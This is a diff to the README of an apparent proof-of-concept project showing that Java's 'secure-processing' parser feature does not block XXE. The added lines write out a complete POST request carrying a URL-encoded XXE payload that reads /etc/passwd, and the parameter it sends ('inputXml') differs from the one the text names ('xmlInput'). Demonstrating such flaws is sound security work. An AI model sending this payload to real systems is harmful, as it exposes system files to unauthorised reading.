@@ -15,4 +15,12 @@ For our PoC, we use `DocumentBuilderFactory` and configure it with `setFeature("
 # Prove that `secure-processing` does not prevent XXE
 
 - To show that the `secure-processing` feature does not do anything against `XXE`, we implemented the `POST /xxe-secure-processing-test` route which takes in a parameter called `xmlInput`.
-- As an example `XXE payload` that works (regardless of `secure-processing`), you may want to use `./xxe_payload.xml` (which renders the `/etc/passwd` file).
+- As a proof of concept to show that `secure-processing` doesn't protect against `XXE`, you can use the example from `./xxe_payload.xml` (which renders the `/etc/passwd` file). For this, run the following `POST` request:
+```
+POST /xxe-secure-processing-test HTTP/1.1
+<redacted for brevity>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 134
+
+inputXml=<%3fxml+version%3d"1.0"%3f><!DOCTYPE+book+[<!ENTITY+xxe+SYSTEM+'file%3a///etc/passwd'>]><book><title>%26xxe%3b</title></book>
+```
